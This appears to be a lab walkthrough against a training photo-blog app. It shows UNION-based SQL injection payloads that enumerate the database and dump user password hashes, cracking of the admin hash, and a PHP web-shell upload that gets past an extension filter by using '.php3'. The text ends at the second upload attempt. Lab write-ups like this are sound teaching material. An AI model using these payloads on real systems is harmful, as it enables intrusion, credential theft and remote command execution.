Navigate to the webpage,

Click on "pool", you should get this url

Checking if it is vulnerable to SQLi, just add ```'``` at the back of ```3```. This should trigger a SQL error

We'll be exploiting this from the webpage

Lets check for the number of columns available in the database. We can use the query
```sql
order by 1 -- 
order by 2 --
order by 3 --
```
Using these queries

This means we don't have a 5th column in the database, which means we have just 4 columns.

Lets check for the column that is compatible with string data, that is the vulnerable column. We can use the query
```sql
AND 0 UNION SELECT 1,2,3,4-- -
```
This query should return the vulnerable column

We can see that column 2 is the vulnerable one. 

Checking for the name of the database, we can use the query
```sql
UNION SELECT 1,database(),3,4-- -
```

We got the name of the database to be ```photoblog```

Checking for the "tablename", we can use the query
```sql
UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema="photoblog"-- -
```
Trying this query

We got the tables available in the database, but the interesting one is the ```users``` table.

Checking for column name available in the ```users``` table, we can use the query
```sql
UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_schema="photoblog" AND table_name="users"-- -
```
Trying this query

We got interesting column names, lets dump the contents of these columns. We can use the query
```sql
UNION SELECT 1,CONCAT(login,0x3a,password),3,4 FROM users-- -
```
You should get this

We got the hash for the ```admin``` user. Lets save this in a file, then we use John to crack it

We got the admin password.

We are logged in.

We can go ahead to add a picture

Lets try to upload a php script, we'll be using this simple payload
```php
<?php system($_GET['cmd']); ?>
```
Save this in a file, then we'll try to upload it

Alrigt, so ".php" extensions aren't allowed. Lets change the extension to something else, say ```.php3```

Lets try to upload this again
